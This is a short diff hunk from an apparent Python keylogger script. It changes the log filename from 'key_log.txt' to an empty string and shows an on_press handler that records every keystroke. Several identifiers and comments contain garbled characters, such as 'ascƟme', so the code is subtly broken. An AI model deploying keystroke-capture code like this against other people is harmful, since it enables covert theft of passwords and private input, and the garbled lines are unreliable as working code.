@@ -23,7 +23,7 @@ import logging
 #if no name it grts into an empty string
 log_dir=""
 #this is a basic logging funcƟons
-logging.basicConfig(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,format='%(ascƟme)s:%(message)s:')
+logging.basicConfig(filename=(log_dir+""),level=logging.DEBUG,format='%(ascƟme)s:%(message)s:')
 #this is from library
 def on_press(key):
  logging.info(str(key))
